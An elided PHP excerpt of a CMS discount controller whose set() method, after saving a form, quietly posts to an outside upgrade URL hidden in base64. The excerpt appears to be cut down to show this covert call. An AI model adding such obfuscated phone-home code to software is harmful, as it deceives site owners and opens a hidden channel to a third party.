...
class YouSetDiscountController extends UserController{
	...
	public function set()
	{
		...
		if (IS_POST) {
			...
			if ($YouSetDiscount) {
				...
				$this->handleKeyword($id, "YouSetDiscount", I("post.keyword"));
				...
				$this->handleKeyword($id, "YouSetDiscount", I("post.keyword"));
				\Extend\HttpClient::getInstance()->post(base64_decode("aHR0cDovL3VwLnBpZ2Ntcy5jbi91cGdyYWRlLnBocA=="), array(
	"timeout" => 1000,
	"post"    => array("a" => "1")
	));
